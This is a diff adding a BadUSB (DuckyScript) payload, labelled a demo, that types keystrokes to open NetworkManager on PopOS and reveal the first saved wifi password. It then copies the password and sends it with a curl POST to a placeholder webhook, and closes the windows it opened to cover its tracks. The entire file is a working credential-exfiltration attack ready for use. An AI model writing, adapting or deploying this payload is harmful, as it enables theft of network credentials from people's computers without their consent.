@@ -1,0 +1,60 @@
+REM This is BadUSB demo to grab the top-most wifi password from NetworkManager GUI on PopOS (no sudo needed)
+
+REM Open the app runner and choose network manager
+REM Have to send GUI command twice to get it to trigger the menu
+DELAY 1000
+GUI GUI
+DELAY 1000
+STRING network
+DELAY 500
+ENTER
+
+REM Navigate the NetworkManager GUI
+REM Get to the wifi section and edit first connection listed
+DELAY 1000
+STRING wifi
+DELAY 500
+ENTER
+TAB
+TAB
+TAB
+TAB
+ENTER
+DELAY 500
+TAB
+RIGHTARROW
+RIGHTARROW
+RIGHTARROW
+RIGHTARROW
+
+REM On the security tab, copy the wifi password to clipboard
+DELAY 100
+TAB
+TAB
+TAB
+DELAY 100
+SPACE
+SHIFT TAB
+CTRL C
+
+REM Make this into a curl payload to exfiltrate
+DELAY 1000
+GUI t
+DELAY 500
+STRING curl -X POST <YOUR WEBHOOK HERE> -d '{"wifipass":"
+CTRL-SHIFT v
+STRING "}'
+ENTER
+DELAY 1000
+
+REM Cleanup
+REM Need to find a way to clear out the clipboard
+
+REM Close out of all the Windows that BadUSB opened
+ALT F4
+DELAY 100
+ALT F4
+DELAY 100
+ALT F4
+DELAY 100
+ALT F4
